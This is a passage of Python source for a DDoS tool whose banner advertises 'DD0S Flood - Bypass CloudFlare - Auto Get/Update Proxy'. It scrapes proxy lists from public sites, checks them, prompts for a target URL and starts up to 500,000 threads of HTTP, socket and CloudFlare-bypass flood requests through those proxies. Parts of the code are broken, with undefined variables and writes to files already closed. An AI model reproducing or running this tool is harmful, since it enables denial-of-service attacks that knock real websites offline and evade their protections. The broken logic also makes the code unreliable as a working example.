                            if choice == 'http':
                                out_file = open('http.txt', 'a')
                            if choice == 'https':
                                out_file = open('https.txt', 'a')
                            if choice == 'sock4':
                                out_file = open('socks4.txt', 'a')
                            if choice == 'sock5':
                                out_file = open('socks5.txt', 'a')
                            while True:
                                out_file.write(x + '\n')
                                out_file.close()
                                continue

            except Exception:
                pass

        def getProxyScanWeb5(self, url_GetProxies5, word, choice):
            try:
                soup = BeautifulSoup((urllib.request.urlopen(url_GetProxies5)), features='lxml')
                for tag in soup.find_all(word):
                    links = tag.a.get('href')
                    result = urllib.request.urlopen(links)
                    for line in result:
                        ipweb = re.findall('(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3}):(?:[\\d]{1,5})', str(line))

                    if ipweb:
                        for x in ipweb:
                            if choice == 'sock5':
                                out_file = open('socks5.txt', 'a')
                            while True:
                                out_file.write(x + '\n')
                                out_file.close()
                                continue

            except Exception:
                pass

        def getProxyFromWeb(self, url_GetProxies3, choice):
            try:
                soup = BeautifulSoup((urllib.request.urlopen(url_GetProxies4)), features='lxml')
                for tag in soup.find_all(words, word):
                    links = tag.a.get('href')
                    result = urllib.request.urlopen(links)
                    for line in result:
                        ipweb = re.findall('(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3}):(?:[\\d]{1,5})', str(line))

                    if ipweb:
                        for x in ipweb:
                            if choice == 'http':
                                out_file = open('http.txt', 'a')
                            if choice == 'https':
                                out_file = open('https.txt', 'a')
                            if choice == 'sock4':
                                out_file = open('socks4.txt', 'a')
                            if choice == 'sock5':
                                out_file = open('socks5.txt', 'a')
                            while True:
                                out_file.write(x + '\n')
                                out_file.close()
                                continue

            except Exception:
                pass
        def getProxyDefault(self, url_GetProxies1, url_GetProxies2, choice):
            r = requests.get(url_GetProxies1)
            x = requests.get(url_GetProxies2)
            if choice == 'http':
                proxy_httpp = open('http.txt', 'ab')
                proxy_httpp.write(r.content)
                proxy_httpp.write(x.content)
                proxy_httpp.close()
            if choice == 'https':
                proxy_httpss = open('https.txt', 'ab')
                proxy_httpss.write(r.content)
                proxy_httpss.write(x.content)
                proxy_httpss.close()
            if choice == 'sock4':
                proxy_socks4 = open('socks4.txt', 'ab')
                proxy_socks4.write(r.content)
                proxy_socks4.write(x.content)
                proxy_socks4.close()
            if choice == 'sock5':
                proxy_socks5 = open('socks5.txt', 'ab')
                proxy_socks5.write(r.content)
                proxy_socks5.write(x.content)
                proxy_socks5.close()

        def checkRunLists(self, timeoutCheck, choice, out_proxies):
            thread_list = []
            for lines in list(proxies_num):
                if choice == 'http':
                    checks = threading.Thread(target=checkProxyLists, args=(lines, 1, timeoutCheck))
                    checks.start()
                if choice == 'https':
                    checks = threading.Thread(target=checkProxyLists, args=(lines, 3, timeoutCheck))
                    checks.start()
                if choice == 'sock4':
                    checks = threading.Thread(target=checkProxyLists, args=(lines, 4, timeoutCheck))
                    checks.start()
                if choice == 'sock5':
                    checks = threading.Thread(target=checkProxyLists, args=(lines, 5, timeoutCheck))
                    checks.start()
                thread_list.append(checks)
                time.sleep(0.01)
                sys.stdout.write(Fore.YELLOW + '[+] Checking done : ' + str(numberChecks) + ' Proxies Founds Maybe Live !!!\r')
                sys.stdout.flush()
            else:
                for checks in list(thread_list):
                    checks.join()
                    sys.stdout.write(Fore.YELLOW + '[+] Checking done : ' + str(numberChecks) + ' Proxies Founds Maybe Live !!!\r')
                    sys.stdout.flush()
                else:
                    print(Fore.YELLOW + '[+] Checked all proxies, Total Worked Live: ' + str(len(proxies_num)) + ' Proxies !!!\r')
                    if choice == 'http':
                        out_proxies = str('http.txt')
                    if choice == 'https':
                        out_proxies = str('https.txt')
                    if choice == 'sock4':
                        out_proxies = str('socks4.txt')
                    if choice == 'sock5':
                        out_proxies = str('socks5.txt')
                    with open(out_proxies, 'w') as (fileCheck):
                        for lines in list(proxies_num):
                            fileCheck.write(lines)

                    fileCheck.close()
                    print('[+] The Proxies live are save in File: ' + out_proxies)

        def checkFilesLists(self, out_proxies):
            proxies = open(out_proxies).readlines()
            proxies_list = []
            print('[+] Checking Duplicate Proxies in Proxy Lists, Waitting !!!')
            for proxy in proxies:
                if proxy not in proxies_list:
                    proxies_list.append(proxy)
            else:
                proxyfile = open(out_proxies, 'w')

            for proxy in list(proxies_list):
                try:
                    pro0 = proxy.split('.')[0]
                    pro1 = proxy.split('.')[1]
                    pro2 = proxy.split('.')[2]
                    pro3 = proxy.split('.')[3]
                    pro4 = pro3.split(':')[0]
                    pro5 = pro3.split(':')[1]
                    if int(pro5) >= 1:
                        if int(pro5) <= 65535:
                            if int(pro0) >= 1:
                                if int(pro0) <= 255:
                                    if int(pro1) >= 0:
                                        if int(pro1) <= 255:
                                            if int(pro2) >= 0:
                                                if int(pro2) <= 255:
                                                    if int(pro4) >= 0:
                                                        if int(pro4) <= 255:
                                                            proxyfile.write(proxy)
                except Exception:
                    pass

            else:
                proxyfile.close()

        def inputjapan(self):
            global choice
            global in_proxies
            global proxies_num
            print(Fore.YELLOW + " \n         ___                              _   _  ____   ____ \n        |_  |                            | | | ||___ | |  _ |\n          | |  __ _  _ __    __ _  _ __  | | | |   / / | |/'| By P3terJ4mes\n          | | / _` || '_ \\  / _` || '_ \\ | | | |   \\ \\ |  /||  AttackTools\n       /\\_/ || (_| || |_) || (_| || | | | \\ \\/ /.__/ /_\\ |/ /Use Proxy Live\n       \\___/  \\__,_|| .__/  \\__,_||_| |_|  \\__/ \\___/(_)\\__/ \n                    | |                                         \n                    |_|High Anonymous Http/Https/Sock4/Sock5             \n       \n  !!!______________________________________________________________________!!!           \n  === >> Method: DD0S Flood - Bypass CloudFlare - Auto Get/Update Proxy << ===\n  ")
            if os.name in ('nt', 'dos', 'ce'):
                os.system('title       ........::::: Code By Thunder(P3terJ4mes),HTTP-TOOLS Ddos Attack :::::........')
            try:
                url = input('[+] Target [https://domain.com]: ')
                choice = 'high anonymous http/https/sock4/sock5'
                while choice == 'high anonymous http/https/sock4/sock5':
                    print('[+] The Best of Type Proxy [sock4-http] for Methods !!!')
                    choice = str(input('[+] Type Proxy[http/https/sock4/sock5]: ')).strip()
                    choose = str(input('[+] Auto Get Proxy[1]/.Your File Proxy[2]: '))
                    if choose == '2':
                        out_proxies = str(input('[+] File Proxy(http/https/sock4/sock5.txt): '))
                        proxies_count = open(out_proxies).readlines()
                        print(Fore.YELLOW + '[+] Number Of Your Proxies: %s May be Live.' % len(proxies_count))
                    if choose != '2':
                        print(Fore.GREEN + '[+] Getting The Proxies lists , waitting for 12 Mins !!!')
                        if choice == 'http':
                            try:
                                os.remove('http.txt')
                            except:
                                pass
                            else:
                                url_GetProxies = 'http://free-proxy-list.net/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://free-proxy-list.net/uk-proxy.html'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://free-proxy-list.net/anonymous-proxy.html'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://www.us-proxy.org/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies4 = 'http://www.proxyserverlist24.top/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'https://proxylistdaily4you.blogspot.com/'
                                word = 'post-body entry-content'
                                words = 'div'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies1 = 'https://api.proxyscrape.com?request=getproxies&proxytype=http&anonymity=elite'
                                url_GetProxies2 = 'https://www.proxy-list.download/api/v1/get?type=http&anon=elite'
                                self.getProxyDefault(url_GetProxies1, url_GetProxies2, choice)
                                foxtools = ['http://api.foxtools.ru/v2/Proxy.txt?page=%d' % n for n in range(1, 6)]
                                for position, url_GetProxies3 in enumerate(foxtools):
                                    self.getProxyFromWeb(url_GetProxies3, choice)
                                else:
                                    for position, url_GetProxies3 in enumerate(nurlsproxies):
                                        self.getProxyFromWeb(url_GetProxies3, choice)
                                    else:
                                        out_http = str('http.txt')
                                        proxies_http = open(out_http).readlines()
                                        print(Fore.YELLOW + '[+] Number Of Http Proxies: %s Elite May Be Live.' % len(proxies_http))

                        if choice == 'https':
                            try:
                                os.remove('https.txt')
                            except:
                                pass
                            else:
                                url_GetProxies = 'http://free-proxy-list.net/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://free-proxy-list.net/uk-proxy.html'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://free-proxy-list.net/anonymous-proxy.html'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://www.us-proxy.org/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies = 'https://www.sslproxies.org/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies4 = 'http://www.sslproxies24.top/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'http://www.proxyserverlist24.top/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'https://proxylistdaily4you.blogspot.com/'
                                word = 'post-body entry-content'
                                words = 'div'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies1 = 'https://api.proxyscrape.com?request=getproxies&proxytype=https&anonymity=elite'
                                url_GetProxies2 = 'https://www.proxy-list.download/api/v1/get?type=https&anon=elite'
                                self.getProxyDefault(url_GetProxies1, url_GetProxies2, choice)
                                foxtools = ['http://api.foxtools.ru/v2/Proxy.txt?page=%d' % n for n in range(1, 6)]
                                for position, url_GetProxies3 in enumerate(foxtools):
                                    self.getProxyFromWeb(url_GetProxies3, choice)
                                else:
                                    for position, url_GetProxies3 in enumerate(nurlsproxies):
                                        self.getProxyFromWeb(url_GetProxies3, choice)
                                    else:
                                        out_https = str('https.txt')
                                        proxies_https = open(out_https).readlines()
                                        print(Fore.YELLOW + '[+] Number Of Https Proxies: %s Elite May Be Live.' % len(proxies_https))

                        if choice == 'sock4':
                            try:
                                os.remove('socks4.txt')
                            except:
                                pass
                            else:
                                url_GetProxies = 'https://www.socks-proxy.net/'
                                self.getProxy(url_GetProxies, choice)
                                url_GetProxies1 = 'https://api.proxyscrape.com?request=getproxies&proxytype=socks4&anonymity=elite'
                                url_GetProxies2 = 'https://www.proxy-list.download/api/v1/get?type=socks4&anon=elite'
                                self.getProxyDefault(url_GetProxies1, url_GetProxies2, choice)
                                url_GetProxies4 = 'http://www.live-socks.net/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'http://www.socks24.org'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'http://www.socksproxylist24.top/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                for position, url_GetProxies3 in enumerate(nurlssocks):
                                    self.getProxyFromWeb(url_GetProxies3, choice)
                                else:
                                    out_socks4 = str('socks4.txt')
                                    proxies_socks4 = open(out_socks4).readlines()
                                    print(Fore.YELLOW + '[+] Number Of Socks4 Proxies: %s Elite May Be Live.' % len(proxies_socks4))

                        if choice == 'sock5':
                            try:
                                os.remove('socks5.txt')
                            except:
                                pass
                            else:
                                url_GetProxies5 = 'https://2freesocks5list.blogspot.com/'
                                word = 'strong'
                                self.getProxyScanWeb5(url_GetProxies5, word, choice)
                                url_GetProxies1 = 'https://api.proxyscrape.com?request=getproxies&proxytype=socks5&anonymity=elite'
                                url_GetProxies2 = 'https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite'
                                self.getProxyDefault(url_GetProxies1, url_GetProxies2, choice)
                                url_GetProxies4 = 'http://www.live-socks.net/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'http://www.socks24.org'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                url_GetProxies4 = 'http://www.socksproxylist24.top/'
                                word = 'post-title entry-title'
                                words = 'h3'
                                self.getProxyScanWeb(url_GetProxies4, word, words, choice)
                                for position, url_GetProxies3 in enumerate(nurlssocks):
                                    self.getProxyFromWeb(url_GetProxies3, choice)
                                else:
                                    out_socks5 = str('socks5.txt')
                                    proxies_socks5 = open(out_socks5).readlines()
                                    print(Fore.YELLOW + '[+] Number Of Socks5 Proxies: %s Elite May Be Live. ' % len(proxies_socks5))

                    checkinglist = input('[+] Checking Your Lists Proxies[Y/N]: ')
                    if not checkinglist == 'y':
                        if checkinglist == 'Y':
                            timeoutCheck = str(input('[+] Timeout Checking beetween The Proxies: '))
                            try:
                                timeoutCheck = int(timeoutCheck)
                            except:
                                timeoutCheck = float(timeoutCheck)
                            else:
                                print(Fore.YELLOW + '[+] Checking Your lists Proxies , Waitting for 12 Mins !!!')
                                if choice == 'http':
                                    proxy_type = 1
                                    if choose == '1':
                                        out_proxies = str('http.txt')
                                        in_proxies = open('http.txt', 'r')
                                    if choose == '2':
                                        out_proxies = str(out_proxies)
                                    proxies_num = open(out_proxies).readlines()
                                    self.checkFilesLists(out_proxies)
                                    self.checkRunLists(timeoutCheck, choice, out_proxies)
                                    in_proxies = open(out_proxies, 'r')
                                if choice == 'https':
                                    proxy_type = 3
                                    if choose == '1':
                                        out_proxies = str('https.txt')
                                    if choose == '2':
                                        out_proxies = str(out_proxies)
                                    proxies_num = open(out_proxies).readlines()
                                    self.checkFilesLists(out_proxies)
                                    self.checkRunLists(timeoutCheck, choice, out_proxies)
                                    in_proxies = open(out_proxies, 'r')
                                if choice == 'sock4':
                                    proxy_type = 4
                                    if choose == '1':
                                        out_proxies = str('socks4.txt')
                                    if choose == '2':
                                        out_proxies = str(out_proxies)
                                    proxies_num = open(out_proxies).readlines()
                                    self.checkFilesLists(out_proxies)
                                    self.checkRunLists(timeoutCheck, choice, out_proxies)
                                    in_proxies = open(out_proxies, 'r')
                                if choice == 'sock5':
                                    proxy_type = 5
                                    if choose == '1':
                                        out_proxies = str('socks5.txt')
                                    if choose == '2':
                                        out_proxies = str(out_proxies)
                                    proxies_num = open(out_proxies).readlines()
                                    self.checkFilesLists(out_proxies)
                                    self.checkRunLists(timeoutCheck, choice, out_proxies)
                                    in_proxies = open(out_proxies, 'r')
                                if checkinglist == 'n' or checkinglist == 'N':
                                    if choose == '1':
                                        if choice == 'http':
                                            in_proxies = open('http.txt', 'r')
                                        if choice == 'https':
                                            in_proxies = open('https.txt', 'r')
                                        if choice == 'sock4':
                                            in_proxies = open('socks4.txt', 'r')
                                        if choice == 'sock5':
                                            in_proxies = open('socks5.txt', 'r')
                        if choose == '2':
                            in_proxies = open(out_proxies, 'r')
            except Exception:
                print('[-] Unknow Target or Type Proxies , Check Internet again !!! ')
            else:
                while True:
                    print(Fore.GREEN + '[+] Methods Tools: \n_____________________________________________________________________\n[1] HttpFlood(Default)            |            [2] CloudFlare(Default)\n[3] HttpFlood(Sockets)            |            [4] CloudFlare(Cookies)\n[5] Find IP-CF(---SSH)            |            [6] Check IP-CF(---DNS) \n---------------------------------------------------------------------')
                    try:
                        mode = input('[+] Choose The number Of Methods: ')
                        if mode == '3':
                            num_threads = int(500000)
                            listsproxy = []
                            for lists in in_proxies:
                                listsproxy.append(lists.split('/n')[0])
                        if mode != '3':
                            try:
                                num_threads = int(500000)
                            except:
                                num_threads = int(600)
                        break
                    except Exception:
                        print('[-] Unknow Methods have been choosen , Check again !!!')

                setup = threading.Event()
                for i in range(num_threads):
                    try:
                        if mode != '3':
                            in_line = in_proxies.readline()
                            RequestsDefault(url, i + 1, in_line, choice, mode, setup).start()
                            in_line = in_line[:-1]
                        setup.set()
                        if mode == '3':
                            RequestsSockets(url, i + 1, listsproxy, choice, setup).start()
                        setup.set()
                    except Exception:
                        print(Fore.YELLOW + "[-] Can't connect The Url or Choice error ,Check Internet again !!!")
                        time.sleep(10)


    if __name__ == '__main__':
        JapanTools().inputjapan()